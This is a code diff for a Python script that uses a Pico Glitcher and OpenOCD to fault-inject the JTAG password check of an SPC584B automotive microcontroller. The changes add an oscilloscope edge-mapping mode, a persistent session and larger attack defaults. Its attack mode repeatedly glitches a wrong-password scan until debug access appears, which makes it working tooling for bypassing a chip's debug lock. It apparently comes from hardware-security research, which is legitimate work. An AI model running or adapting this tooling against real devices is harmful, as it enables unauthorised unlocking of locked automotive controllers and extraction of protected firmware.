@@ -1,17 +1,19 @@
 #!/usr/bin/env python3
-"""Fault the SPC584B JTAG-password transaction without pausing the TAP.
+"""Calibrate and fault the SPC584B JTAG-password transaction.
 
 The experiment sends one uninterrupted 256-bit password scan. The Pico
 Glitcher counts TCK edges from the start of that scan and fires early enough
 for a delayed pulse to land before, during, or after the final scan clocks.
 
-Two explicit modes are provided:
+Three explicit modes are provided:
 
+* edge-map: emit scope markers with the glitch lead physically disconnected;
 * characterize: send the correct password and stop on the first changed result;
 * attack: send a one-bit-wrong password and stop on unexpected debug access.
 
-This script never writes flash, UTEST, DCF, lifecycle, or OTP. Results are
-printed to stdout; there is deliberately no campaign database.
+OpenOCD remains alive across attempts and is restarted only if its Tcl session
+becomes unusable. This script never writes flash, UTEST, DCF, lifecycle, or
+OTP. Results are printed to stdout; there is deliberately no campaign database.
 """
 
 from __future__ import annotations
@@ -56,7 +58,6 @@ class ExperimentError(RuntimeError):
 
 @dataclass(frozen=True)
 class Point:
-    edge_count: int
     delay_ns: int
     length_ns: int
     repeat: int
@@ -69,7 +70,7 @@ class Result:
 
     @property
     def access_observed(self) -> bool:
-        return self.state.startswith("ACCESS_")
+        return self.state in ("ACCESS_JUN_SET", "ACCESS_JUN_CLEAR")
 
 
 class OpenOCDSession:
@@ -298,6 +299,10 @@ def password_scan_command(words: tuple[int, ...]) -> str:
 
 
 def reset_target(session: OpenOCDSession, hold_ms: int) -> None:
+    if session.halted:
+        session.command("resume")
+        session.halted = False
+        session.preserve_halt = False
     session.command(f"irscan spc584b.tap 0x{DCI_CONTROL_INSTRUCTION:02x}")
     session.command(
         f"drscan spc584b.tap 32 0x{DCI_DESTRUCTIVE_RESET:08x}"
@@ -305,6 +310,8 @@ def reset_target(session: OpenOCDSession, hold_ms: int) -> None:
     time.sleep(hold_ms / 1000)
     session.command(f"irscan spc584b.tap 0x{DCI_CONTROL_INSTRUCTION:02x}")
     session.command("drscan spc584b.tap 32 0x00000000")
+    session.halted = False
+    session.preserve_halt = False
 
 
 def select_password_register(session: OpenOCDSession) -> None:
@@ -350,81 +357,103 @@ def probe_debug(session: OpenOCDSession, halt_timeout_ms: int) -> Result:
 
 
 def submit_without_glitch(
-    openocd: str,
+    session: OpenOCDSession,
     words: tuple[int, ...],
     args: argparse.Namespace,
 ) -> Result:
-    with OpenOCDSession(openocd, args.adapter_speed_khz) as session:
-        reset_target(session, args.reset_hold_ms)
-        select_password_register(session)
-        session.command(
-            password_scan_command(words),
-            "<redacted uninterrupted 256-bit JTAG password scan>",
-        )
-        return probe_debug(session, args.control_halt_timeout_ms)
+    reset_target(session, args.reset_hold_ms)
+    select_password_register(session)
+    session.command(
+        password_scan_command(words),
+        "<redacted uninterrupted 256-bit JTAG password scan>",
+    )
+    return probe_debug(session, args.control_halt_timeout_ms)
 
 
 def run_controls(
-    openocd: str,
+    session: OpenOCDSession,
     correct_words: tuple[int, ...],
     wrong_words: tuple[int, ...],
     args: argparse.Namespace,
 ) -> None:
-    correct = submit_without_glitch(openocd, correct_words, args)
+    correct = submit_without_glitch(session, correct_words, args)
     print(f"CONTROL password=correct result={correct.state} detail={correct.detail}")
     if correct.state != "ACCESS_JUN_SET":
         raise ExperimentError(
             f"correct-password control failed without a glitch: {correct.state}"
         )
 
-    wrong = submit_without_glitch(openocd, wrong_words, args)
+    wrong = submit_without_glitch(session, wrong_words, args)
     print(f"CONTROL password=wrong result={wrong.state} detail={wrong.detail}")
-    if wrong.access_observed:
+    if wrong.state != "LOCKED_OR_UNRESPONSIVE":
         raise ExperimentError(
-            f"wrong-password control unexpectedly obtained access: {wrong.state}"
+            f"wrong-password control did not produce the expected locked response: "
+            f"{wrong.state}"
         )
 
 
 def run_glitched_submission(
-    openocd: str,
+    session: OpenOCDSession,
     glitcher: PicoGlitcher,
     words: tuple[int, ...],
     point: Point,
     args: argparse.Namespace,
 ) -> Result:
-    with OpenOCDSession(openocd, args.adapter_speed_khz) as session:
-        reset_target(session, args.reset_hold_ms)
-        select_password_register(session)
+    reset_target(session, args.reset_hold_ms)
+    select_password_register(session)
 
-        glitcher.edge_count_trigger(
-            pin_trigger=args.trigger_input,
-            number_of_edges=point.edge_count,
-            edge_type="rising",
+    glitcher.edge_count_trigger(
+        pin_trigger=args.trigger_input,
+        number_of_edges=args.edge_count,
+        edge_type="rising",
+    )
+    glitcher.arm(point.delay_ns, point.length_ns)
+
+    scan_error: ExperimentError | None = None
+    try:
+        session.command(
+            password_scan_command(words),
+            "<redacted uninterrupted 256-bit JTAG password scan>",
         )
-        glitcher.arm(point.delay_ns, point.length_ns)
+    except ExperimentError as error:
+        scan_error = error
 
-        scan_error: ExperimentError | None = None
-        try:
-            session.command(
-                password_scan_command(words),
-                "<redacted uninterrupted 256-bit JTAG password scan>",
-            )
-        except ExperimentError as error:
-            scan_error = error
+    if not wait_for_trigger(glitcher, args.block_timeout):
+        return Result("TRIGGER_TIMEOUT", TRIGGER_TIMEOUT_MARKER)
 
-        if not wait_for_trigger(glitcher, args.block_timeout):
-            return Result("TRIGGER_TIMEOUT", TRIGGER_TIMEOUT_MARKER)
+    result = probe_debug(session, args.halt_timeout_ms)
+    if result.access_observed and args.mode == "attack":
+        session.preserve_halt = True
 
-        result = probe_debug(session, args.halt_timeout_ms)
-        if result.access_observed and args.mode == "attack":
-            session.preserve_halt = True
+    if scan_error is None:
+        return result
+    detail = f"scan_error={compact_error(scan_error)};probe={result.detail}"
+    if result.access_observed:
+        return Result(result.state, detail)
+    return Result("SCAN_OR_TARGET_FAULT", detail)
 
-        if scan_error is None:
-            return result
-        detail = f"scan_error={compact_error(scan_error)};probe={result.detail}"
-        if result.access_observed:
-            return Result(result.state, detail)
-        return Result("SCAN_OR_TARGET_FAULT", detail)
+
+def emit_edge_marker(
+    session: OpenOCDSession,
+    glitcher: PicoGlitcher,
+    words: tuple[int, ...],
+    edge_count: int,
+    args: argparse.Namespace,
+) -> bool:
+    """Emit a scope marker; GLITCH must be disconnected from the target rail."""
+    reset_target(session, args.reset_hold_ms)
+    select_password_register(session)
+    glitcher.edge_count_trigger(
+        pin_trigger=args.trigger_input,
+        number_of_edges=edge_count,
+        edge_type="rising",
+    )
+    glitcher.arm(0, args.marker_length_ns)
+    session.command(
+        password_scan_command(words),
+        "<redacted uninterrupted 256-bit JTAG password scan>",
+    )
+    return wait_for_trigger(glitcher, args.block_timeout)
 
 
 def inclusive_values(bounds: tuple[int, int], step: int) -> range:
@@ -435,8 +464,7 @@ def inclusive_values(bounds: tuple[int, int], step: int) -> range:
 
 def build_points(args: argparse.Namespace) -> list[Point]:
     points = [
-        Point(edge, delay, length, repeat)
-        for edge in range(args.edge_count[0], args.edge_count[1] + 1)
+        Point(delay, length, repeat)
         for delay in inclusive_values(tuple(args.delay), args.step_ns)
         for length in inclusive_values(tuple(args.length), args.step_ns)
         for repeat in range(args.repeats)
@@ -449,15 +477,22 @@ def build_points(args: argparse.Namespace) -> list[Point]:
     return points
 
 
+def apply_mode_defaults(args: argparse.Namespace) -> None:
+    if args.repeats is None:
+        args.repeats = 100 if args.mode == "attack" else 1
+    if args.attempts is None:
+        args.attempts = 100_000 if args.mode == "attack" else 0
+
+
 def parse_args() -> argparse.Namespace:
     parser = argparse.ArgumentParser(description=__doc__)
     parser.add_argument(
         "--mode",
         required=True,
-        choices=("characterize", "attack"),
+        choices=("edge-map", "characterize", "attack"),
         help=(
-            "characterize faults a correct password; attack faults a one-bit-wrong "
-            "password"
+            "edge-map emits safe scope markers; characterize faults a correct "
+            "password; attack faults a one-bit-wrong password"
         ),
     )
     parser.add_argument("--rpico", required=True, help="Pico Glitcher serial port")
@@ -469,14 +504,30 @@ def parse_args() -> argparse.Namespace:
     )
     parser.add_argument(
         "--edge-count",
+        type=int,
+        metavar="EDGE",
+        help=(
+            "one scope-calibrated TCK edge count for characterize/attack"
+        ),
+    )
+    parser.add_argument(
+        "--edge-range",
         nargs=2,
         type=int,
-        default=(252, 260),
+        default=(252, 264),
         metavar=("MIN", "MAX"),
-        help=(
-            "inclusive TCK edge-count range after arming (default: 252 260); "
-            "confirm the mapping on an oscilloscope"
-        ),
+        help="inclusive edge-map range (default: 252 264)",
+    )
+    parser.add_argument(
+        "--marker-length-ns",
+        type=int,
+        default=8,
+        help="scope-marker pulse width in edge-map mode (default: 8)",
+    )
+    parser.add_argument(
+        "--confirm-glitch-disconnected",
+        action="store_true",
+        help="confirm GLITCH is physically disconnected from the target rail",
     )
     parser.add_argument("--delay", nargs=2, type=int, default=(0, 1000))
     parser.add_argument("--length", nargs=2, type=int, default=(8, 28))
@@ -484,10 +535,16 @@ def parse_args() -> argparse.Namespace:
     parser.add_argument(
         "--attempts",
         type=int,
-        default=1000,
-        help="maximum shuffled attempts; 0 runs the complete grid",
+        help=(
+            "maximum shuffled attempts; 0 runs the complete grid "
+            "(defaults: characterize=complete grid, attack=100000)"
+        ),
     )
-    parser.add_argument("--repeats", type=int, default=1)
+    parser.add_argument(
+        "--repeats",
+        type=int,
+        help="repetitions per grid point (defaults: characterize=1, attack=100)",
+    )
     parser.add_argument("--seed", type=int, default=584)
     parser.add_argument(
         "--trigger-input",
@@ -508,17 +565,30 @@ def parse_args() -> argparse.Namespace:
 
 
 def validate_args(args: argparse.Namespace) -> None:
-    for name in ("edge_count", "delay", "length"):
+    for name in ("delay", "length"):
         low, high = getattr(args, name)
         if low < 0 or high < low:
             raise ExperimentError(f"invalid --{name.replace('_', '-')} range")
-    if args.edge_count[0] < 1:
-        raise ExperimentError("--edge-count values must be positive")
+    edge_low, edge_high = args.edge_range
+    if edge_low < 1 or edge_high < edge_low:
+        raise ExperimentError("invalid --edge-range")
+    if args.mode == "edge-map":
+        if not args.confirm_glitch_disconnected:
+            raise ExperimentError(
+                "edge-map requires --confirm-glitch-disconnected after physically "
+                "disconnecting GLITCH from the target rail"
+            )
+    elif args.edge_count is None or args.edge_count < 1:
+        raise ExperimentError(
+            "characterize/attack require one positive, scope-calibrated --edge-count"
+        )
+    if args.marker_length_ns <= 0:
+        raise ExperimentError("--marker-length-ns must be positive")
     if args.step_ns <= 0:
         raise ExperimentError("--step-ns must be positive")
-    if args.attempts < 0:
+    if args.attempts is not None and args.attempts < 0:
         raise ExperimentError("--attempts cannot be negative")
-    if args.repeats <= 0:
+    if args.repeats is not None and args.repeats <= 0:
         raise ExperimentError("--repeats must be positive")
     if args.adapter_speed_khz <= 0:
         raise ExperimentError("--adapter-speed-khz must be positive")
@@ -532,8 +602,10 @@ def validate_args(args: argparse.Namespace) -> None:
 
 def main() -> int:
     args = parse_args()
+    session: OpenOCDSession | None = None
     try:
         validate_args(args)
+        apply_mode_defaults(args)
         openocd = find_openocd()
         password = read_password(args.password_file)
         correct_words = password_words(password, wrong=False)
@@ -553,9 +625,14 @@ def main() -> int:
                 f"unsupported PicoGlitcher frequency: {frequency_hz} Hz"
             )
         tick_ns = 1_000_000_000 // frequency_hz
-        if args.step_ns % tick_ns:
+        if args.mode != "edge-map" and args.step_ns % tick_ns:
             raise ExperimentError(
                 f"--step-ns must be a multiple of the Pico timing tick ({tick_ns} ns)"
+            )
+        if args.mode == "edge-map" and args.marker_length_ns % tick_ns:
+            raise ExperimentError(
+                "--marker-length-ns must be a multiple of the Pico timing tick "
+                f"({tick_ns} ns)"
             )
 
         if args.high_power:
@@ -563,25 +640,57 @@ def main() -> int:
         else:
             glitcher.set_lpglitch()
 
-        points = build_points(args)
         print(f"MODE={args.mode}", flush=True)
         print("PASSWORD_SCAN=UNINTERRUPTED_256_BIT_DRSCAN", flush=True)
         print("TRIGGER_REFERENCE=TCK_EDGES_AFTER_PASSWORD_IR_SELECTION", flush=True)
-        print("EDGE_MAPPING_REQUIRES_OSCILLOSCOPE=yes", flush=True)
         print(f"PICO_PIO_TICK_NS={tick_ns}", flush=True)
-        print(f"POINTS_THIS_RUN={len(points)}", flush=True)
 
-        run_controls(openocd, correct_words, wrong_words, args)
+        session = OpenOCDSession(openocd, args.adapter_speed_khz).__enter__()
+        run_controls(session, correct_words, wrong_words, args)
+
+        if args.mode == "edge-map":
+            print("GLITCH_TARGET_CONNECTION=DISCONNECTED_CONFIRMED", flush=True)
+            print("EDGE_MAPPING_REQUIRES_OSCILLOSCOPE=yes", flush=True)
+            for edge_count in range(args.edge_range[0], args.edge_range[1] + 1):
+                observed = emit_edge_marker(
+                    session, glitcher, wrong_words, edge_count, args
+                )
+                print(
+                    f"EDGE_MAP edge_count={edge_count} marker_observed="
+                    f"{'yes' if observed else 'no'}",
+                    flush=True,
+                )
+            print("EXPERIMENT_RESULT=EDGE_MAP_COMPLETE", flush=True)
+            return EXIT_NO_CANDIDATE
+
+        points = build_points(args)
+        print(f"CALIBRATED_EDGE_COUNT={args.edge_count}", flush=True)
+        print(f"POINTS_THIS_RUN={len(points)}", flush=True)
 
         words = correct_words if args.mode == "characterize" else wrong_words
         started = time.monotonic()
         for attempt, point in enumerate(points):
-            result = run_glitched_submission(
-                openocd, glitcher, words, point, args
-            )
+            try:
+                result = run_glitched_submission(
+                    session, glitcher, words, point, args
+                )
+            except ExperimentError as first_error:
+                print(
+                    f"SESSION_RESTART attempt={attempt} "
+                    f"reason={compact_error(first_error)}",
+                    flush=True,
+                )
+                session.close()
+                session = OpenOCDSession(
+                    openocd, args.adapter_speed_khz
+                ).__enter__()
+                run_controls(session, correct_words, wrong_words, args)
+                result = run_glitched_submission(
+                    session, glitcher, words, point, args
+                )
             elapsed = max(time.monotonic() - started, 0.001)
             print(
-                f"ATTEMPT={attempt} edge_count={point.edge_count} "
+                f"ATTEMPT={attempt} edge_count={args.edge_count} "
                 f"delay_ns={point.delay_ns} length_ns={point.length_ns} "
                 f"repeat={point.repeat} result={result.state} "
                 f"rate={(attempt + 1) / elapsed:.2f}/s detail={result.detail}",
@@ -590,13 +699,13 @@ def main() -> int:
 
             if result.state == "TRIGGER_TIMEOUT":
                 raise ExperimentError(
-                    f"edge count {point.edge_count} was not observed during the scan"
+                    f"edge count {args.edge_count} was not observed during the scan"
                 )
 
             if args.mode == "attack" and result.access_observed:
                 print(
                     "EXPERIMENT_RESULT=ACCESS_CANDIDATE "
-                    f"edge_count={point.edge_count} delay_ns={point.delay_ns} "
+                    f"edge_count={args.edge_count} delay_ns={point.delay_ns} "
                     f"length_ns={point.length_ns} repeat={point.repeat}",
                     flush=True,
                 )
@@ -606,7 +715,7 @@ def main() -> int:
             if args.mode == "characterize" and result.state != "ACCESS_JUN_SET":
                 print(
                     "EXPERIMENT_RESULT=FAULT_OBSERVED "
-                    f"edge_count={point.edge_count} delay_ns={point.delay_ns} "
+                    f"edge_count={args.edge_count} delay_ns={point.delay_ns} "
                     f"length_ns={point.length_ns} repeat={point.repeat} "
                     f"result={result.state}",
                     flush=True,
@@ -634,6 +743,9 @@ def main() -> int:
             flush=True,
         )
         return EXIT_ERROR
+    finally:
+        if session is not None:
+            session.close()
 
 
 if __name__ == "__main__":
